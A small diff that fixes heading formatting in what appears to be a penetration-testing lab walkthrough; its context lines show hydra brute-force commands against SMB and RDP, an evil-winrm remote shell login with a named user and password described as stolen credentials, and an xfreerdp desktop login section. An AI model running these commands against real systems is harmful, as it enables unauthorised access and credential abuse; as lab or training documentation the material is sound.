@@ -46,7 +46,7 @@ Edit
 hydra -L users.txt -P passwords.txt smb://10.0.0.101
 hydra -L users.txt -P passwords.txt rdp://10.0.0.101
 
-###3. Remote Shell via Evil-WinRM
+### 3. Remote Shell via Evil-WinRM
 Tool: Evil-WinRM
 Target: client-win
 Purpose: Remote PowerShell access using stolen credentials.
@@ -56,7 +56,7 @@ Copy
 Edit
 evil-winrm -i 10.0.0.101 -u jdoe -p @password123!
 
-###4. Remote Desktop Session (xfreerdp)
+### 4. Remote Desktop Session (xfreerdp)
 Tool: xfreerdp
 Purpose: Full GUI login to target workstation.
 
